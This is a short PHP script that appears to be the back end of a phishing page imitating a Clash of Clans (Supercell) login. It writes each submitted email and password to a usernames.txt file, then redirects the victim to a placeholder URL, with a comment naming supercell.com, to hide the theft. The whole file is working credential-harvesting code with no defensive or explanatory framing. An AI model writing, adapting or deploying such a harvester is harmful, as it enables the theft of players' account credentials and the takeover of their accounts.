<?php
file_put_contents("usernames.txt", "COC Username: " . $_POST["email"] ."\nPassword: ". $_POST["password"] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.supercell.com
header("Location: $url");
exit();
?>